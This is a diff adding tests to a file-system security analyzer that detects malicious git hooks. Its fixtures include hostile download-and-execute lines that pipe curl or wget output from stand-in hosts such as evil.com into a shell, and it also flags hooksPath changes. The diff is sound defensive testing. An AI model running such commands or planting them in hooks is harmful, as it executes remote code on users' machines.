@@ -436,4 +436,51 @@ suite('FsAnalyzer Tests', () => {
       expect(result!.securityEvent!.iocs[0].confidence).to.equal(1);
     });
   });
+
+  // ── Malicious Git Hooks ──────────────────────────────────────────────────────
+
+  suite('Rule Matching — Malicious Git Hooks', () => {
+    let fsStub: sinon.SinonStub;
+
+    setup(() => {
+      // Stubujemy fs.readFileSync, żeby udawać zawartość pliku złośliwego
+      const fs = require('fs');
+      fsStub = sinon.stub(fs, 'readFileSync');
+    });
+
+    teardown(() => {
+      fsStub.restore();
+    });
+
+    test('should detect curl payload in .husky/pre-commit', () => {
+      fsStub.returns('curl -s https://malicious-site.com/payload | bash');
+      const r = analyzer.analyze(makeEvent('/home/user/project/.husky/pre-commit', 'write'));
+
+      expect(r!.verdict.allowed).to.be.false;
+      expect(r!.securityEvent!.iocs[0].rule).to.include('Malicious Git Hooks Write');
+    });
+
+    test('should detect wget payload in .git/hooks/pre-commit', () => {
+      fsStub.returns('wget -qO- https://evil.com/loader.sh | sh');
+      const r = analyzer.analyze(makeEvent('/home/user/project/.git/hooks/pre-commit', 'write'));
+
+      expect(r!.verdict.allowed).to.be.false;
+    });
+
+    test('should NOT detect normal lint-staged in .husky/pre-commit', () => {
+      fsStub.returns('npx lint-staged');
+      const r = analyzer.analyze(makeEvent('/home/user/project/.husky/pre-commit', 'write'));
+
+      // Brak złośliwego stringa = akceptacja
+      expect(r!.verdict.allowed).to.be.true;
+    });
+
+    test('should detect modification of core.hooksPath in .git/config', () => {
+      fsStub.returns('[core]\n\thooksPath = .husky\n');
+      const r = analyzer.analyze(makeEvent('/home/user/project/.git/config', 'write'));
+
+      expect(r!.verdict.allowed).to.be.false;
+      expect(r!.securityEvent!.iocs[0].rule).to.include('Git Config Core Hooks Write');
+    });
+  });
 });
